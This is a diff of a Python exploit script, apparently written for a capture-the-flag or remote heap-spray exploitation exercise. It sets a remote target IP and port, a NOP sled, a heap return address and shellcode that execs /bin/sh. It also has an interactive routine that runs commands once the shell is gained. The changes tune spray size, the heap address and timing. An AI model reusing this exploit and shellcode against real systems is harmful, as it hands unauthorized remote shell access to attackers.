@@ -20,7 +20,8 @@ if LOCAL:
     HOST = "localhost"
     PORT = "55000"
     SLEEP_TIME = 0
-    MAX_ENTRIES = 16384
+    MAX_ENTRIES = 8000
+    #MAX_ENTRIES = 16384
 else:
     HOST = "54.215.5.83"
     PORT = "3036"
@@ -28,7 +29,9 @@ else:
     MAX_ENTRIES = 8000
 
 NOP = "\x90"
-HEAP_ADDRESS = "\x0b\x45\xc0\x08"
+HEAP_ADDRESS = "\x09\x45\xc0\x08"
+#HEAP_ADDRESS = "\x0b\x45\xc0\x08"
+#HEAP_ADDRESS = "\x0b\xaa\xb1\x50"
 
 # Some useful shellcode (Not Aleph One's, but it does exec \bin\sh)
 SHELLCODE = "\x6a\x0b\x58\x99\x52\x68\x2f\x2fsh\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
@@ -192,7 +195,7 @@ def go_interactive(con):
 
 
     con.write("ls\n")
-    time.sleep(1)
+    time.sleep(10)
     resp = con.read_one(0)
     print resp
     if not resp:
